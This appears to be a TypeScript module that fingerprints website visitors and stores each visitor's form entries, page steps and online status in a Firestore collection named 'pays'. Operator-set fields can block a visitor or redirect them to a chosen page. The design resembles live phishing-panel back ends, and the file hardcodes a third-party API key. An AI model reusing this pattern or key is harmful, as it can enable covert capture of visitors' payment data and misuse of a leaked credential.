import { db } from "./firebase"
import { secureAddData as addData } from "./secure-firebase"
import { doc, updateDoc, serverTimestamp, getDoc, Firestore } from "firebase/firestore"

export function generateVisitorRef(): string {
  const timestamp = Date.now().toString(36)
  const random = Math.random().toString(36).substring(2, 8)
  return `REF-${timestamp}-${random}`.toUpperCase()
}

export function getOrCreateVisitorID(): string {
  if (typeof window === 'undefined') {
    return ''
  }

  let visitorId = localStorage.getItem("visitor_id")
  
  if (!visitorId) {
    visitorId = generateVisitorRef()
    localStorage.setItem("visitor_id", visitorId)
  }

  return visitorId
}

export function getDeviceType(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
    return 'tablet'
  }
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
    return 'mobile'
  }
  return 'desktop'
}

export function getBrowser(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (ua.includes('Firefox')) return 'Firefox'
  if (ua.includes('SamsungBrowser')) return 'Samsung Browser'
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera'
  if (ua.includes('Trident')) return 'Internet Explorer'
  if (ua.includes('Edge')) return 'Edge'
  if (ua.includes('Chrome')) return 'Chrome'
  if (ua.includes('Safari')) return 'Safari'
  
  return 'unknown'
}

export function getOS(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (ua.includes('Win')) return 'Windows'
  if (ua.includes('Mac')) return 'MacOS'
  if (ua.includes('Linux')) return 'Linux'
  if (ua.includes('Android')) return 'Android'
  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS'
  
  return 'unknown'
}

export function getScreenResolution(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  return `${window.screen.width}x${window.screen.height}`
}

export async function getCountry(): Promise<string> {
  const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
  
  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 3000)
    
    const response = await fetch(url, { signal: controller.signal })
    clearTimeout(timeoutId)
    
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`)
    }
    const country = await response.text()
    return country
  } catch (error) {
    console.error("Error fetching country:", error)
    return "unknown"
  }
}

/**
 * ✅ OPTIMIZATION 1: Batch pending updates
 * Instead of writing immediately, queue updates and batch them
 */
class UpdateBatcher {
  private updates: Map<string, Record<string, any>> = new Map()
  private timers: Map<string, NodeJS.Timeout> = new Map()
  private readonly BATCH_DELAY = 3000 // 3 seconds (was 30 seconds for activity, now batched)

  queue(visitorId: string, data: Record<string, any>) {
    if (!this.updates.has(visitorId)) {
      this.updates.set(visitorId, {})
    }
    
    const current = this.updates.get(visitorId)!
    Object.assign(current, data)

    // Clear existing timer for this visitor
    if (this.timers.has(visitorId)) {
      clearTimeout(this.timers.get(visitorId)!)
    }

    // Set new timer to flush after delay
    const timer = setTimeout(() => {
      this.flush(visitorId)
    }, this.BATCH_DELAY)

    this.timers.set(visitorId, timer)
  }

  async flush(visitorId: string) {
    const updates = this.updates.get(visitorId)
    if (!updates || Object.keys(updates).length === 0) return

    try {
      const docRef = doc(db as Firestore, "pays", visitorId)
      await updateDoc(docRef, updates)
      console.log(`[UpdateBatcher] Flushed ${Object.keys(updates).length} updates for ${visitorId}`)
    } catch (error) {
      console.error("[UpdateBatcher] Error flushing updates:", error)
    }

    this.updates.delete(visitorId)
    this.timers.delete(visitorId)
  }

  async flushImmediate(visitorId: string) {
    await this.flush(visitorId)
  }
}

const updateBatcher = new UpdateBatcher()

export async function initializeVisitorTracking(visitorId: string) {
  if (db) {
    try {
      const docRef = doc(db as Firestore, "pays", visitorId)
      const docSnap = await getDoc(docRef)
      if (docSnap.exists()) {
        // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
        updateBatcher.queue(visitorId, {
          isOnline: true,
          lastActiveAt: new Date().toISOString()
        })
        setupOnlineOfflineListeners(visitorId)
        setupActivityTracker(visitorId)
        return docSnap.data()
      }
    } catch (error) {
      console.error("[OnlineTracking] Error checking existing visitor:", error)
    }
  }

  const country = await getCountry()
  
  const trackingData = {
    id: visitorId,
    referenceNumber: visitorId,
    country: country,
    deviceType: getDeviceType(),
    browser: getBrowser(),
    os: getOS(),
    screenResolution: getScreenResolution(),
    isOnline: true,
    isBlocked: false,
    isUnread: true,
    currentStep: 1,
    currentPage: "home",
    createdAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
    sessionStartAt: new Date().toISOString()
  }
  
  await addData(trackingData)
  
  setupOnlineOfflineListeners(visitorId)
  
  setupActivityTracker(visitorId)
  
  return trackingData
}

/**
 * ✅ OPTIMIZATION 3: Reduce online/offline listener frequency
 * Only update on actual state changes, not on every visibility change
 */
function setupOnlineOfflineListeners(visitorId: string) {
  if (typeof window === 'undefined') return
  if (!db) return
  
  let lastOnlineStatus: boolean | null = null

  const updateOnlineStatus = async (isOnline: boolean) => {
    if (!visitorId || !db) return
    
    // Only update if status actually changed
    if (lastOnlineStatus === isOnline) {
      return
    }
    lastOnlineStatus = isOnline

    try {
      const docRef = doc(db as Firestore, "pays", visitorId)
      // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
      updateBatcher.queue(visitorId, {
        isOnline: isOnline,
        lastActiveAt: new Date().toISOString()
      })
    } catch (error) {
      console.error("[OnlineTracking] Error updating online status:", error)
    }
  }
  
  window.addEventListener('online', () => updateOnlineStatus(true))
  window.addEventListener('offline', () => updateOnlineStatus(false))
  
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
      updateOnlineStatus(true)
    } else {
      updateOnlineStatus(false)
    }
  })
  
  window.addEventListener('beforeunload', () => {
    // Flush immediately on page unload
    updateBatcher.flushImmediate(visitorId)
  })
}

/**
 * ✅ OPTIMIZATION 4: Increase activity tracker interval
 * From 30 seconds to 120 seconds, and batch with other updates
 */
function setupActivityTracker(visitorId: string) {
  if (typeof window === 'undefined') return
  if (!db) return
  
  const updateActivity = async () => {
    if (!visitorId || !db) return
    
    try {
      // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
      updateBatcher.queue(visitorId, {
        lastActiveAt: new Date().toISOString(),
        isOnline: true
      })
    } catch (error) {
      console.error("[OnlineTracking] Error updating activity:", error)
    }
  }
  
  // ✅ OPTIMIZATION 4: Increased from 30000ms to 120000ms (2 minutes)
  const intervalId = setInterval(updateActivity, 120000)
  
  window.addEventListener('beforeunload', () => {
    clearInterval(intervalId)
    updateBatcher.flushImmediate(visitorId)
  })
  
  const events = ['mousedown', 'keydown', 'scroll', 'touchstart']
  let lastActivityUpdate = Date.now()
  
  const handleActivity = () => {
    const now = Date.now()
    // ✅ OPTIMIZATION 5: Increased from 10 seconds to 30 seconds
    if (now - lastActivityUpdate > 30000) {
      lastActivityUpdate = now
      updateActivity()
    }
  }
  
  events.forEach(event => {
    document.addEventListener(event, handleActivity, { passive: true })
  })
}

/**
 * ✅ OPTIMIZATION 2: Batch page updates instead of immediate write
 */
export async function updateVisitorPage(visitorId: string, page: string, step: number) {
  if (!visitorId || !db) return
  
  try {
    // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
    updateBatcher.queue(visitorId, {
      currentPage: page,
      currentStep: step,
      lastActiveAt: new Date().toISOString(),
      [`${page}VisitedAt`]: new Date().toISOString()
    })
  } catch (error) {
    console.error("[OnlineTracking] Error updating visitor page:", error)
  }
}

/**
 * ✅ OPTIMIZATION 2: Batch form data updates instead of immediate write
 */
export async function saveFormData(visitorId: string, data: any, pageName: string) {
  if (!visitorId || !db) return
  
  try {
    const timestampedData = {
      ...data,
      [`${pageName}UpdatedAt`]: new Date().toISOString(),
      lastActiveAt: new Date().toISOString()
    }
    
    // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
    updateBatcher.queue(visitorId, timestampedData)
  } catch (error) {
    console.error("[OnlineTracking] Error saving form data:", error)
  }
}

export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  if (!db) return false
  try {
    const docRef = doc(db as Firestore, "pays", visitorId)
    const docSnap = await import('firebase/firestore').then(m => m.getDoc(docRef))
    
    if (docSnap.exists()) {
      return docSnap.data().isBlocked === true
    }
    
    return false
  } catch (error) {
    console.error("Error checking block status:", error)
    return false
  }
}

export async function checkRedirectPage(visitorId: string): Promise<string | null> {
  if (!db) return null
  try {
    const docRef = doc(db as Firestore, "pays", visitorId)
    const docSnap = await import('firebase/firestore').then(m => m.getDoc(docRef))
    
    if (docSnap.exists()) {
      const data = docSnap.data()
      if (data.redirectPage) {
        return data.redirectPage
      }
    }
    
    return null
  } catch (error) {
    console.error("Error checking redirect page:", error)
    return null
  }
}

/**
 * ✅ OPTIMIZATION 2: Batch redirect clear instead of immediate write
 */
export async function clearRedirectPage(visitorId: string) {
  if (!visitorId || !db) return
  
  try {
    // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
    updateBatcher.queue(visitorId, {
      redirectPage: null,
      redirectedAt: new Date().toISOString()
    })
  } catch (error) {
    console.error("[OnlineTracking] Error clearing redirect page:", error)
  }
}

/**
 * ✅ OPTIMIZATION 2: Batch redirect set instead of immediate write
 */
export async function setRedirectPage(visitorId: string, targetPage: string) {
  if (!visitorId || !db) return
  
  try {
    // ✅ OPTIMIZATION 2: Batch the update instead of immediate write
    updateBatcher.queue(visitorId, {
      redirectPage: targetPage,
      redirectRequestedAt: new Date().toISOString()
    })
  } catch (error) {
    console.error("[OnlineTracking] Error setting redirect page:", error)
  }
}
